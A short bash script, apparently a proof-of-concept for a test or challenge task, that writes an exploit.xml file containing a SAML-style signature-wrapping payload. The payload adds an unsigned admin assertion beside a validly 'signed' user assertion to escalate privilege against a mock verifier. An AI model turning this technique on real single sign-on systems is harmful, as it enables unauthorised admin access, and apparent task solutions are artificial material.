#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'PY'
import os
from pathlib import Path
Path(os.environ['OUT_DIR'], 'exploit.xml').write_text('<Response><Assertion ID="signed"><Subject>user@example.com</Subject><Role>user</Role><Signature>VALID:signed</Signature></Assertion><Assertion ID="admin"><Subject>admin@example.com</Subject><Role>admin</Role></Assertion></Response>')
PY
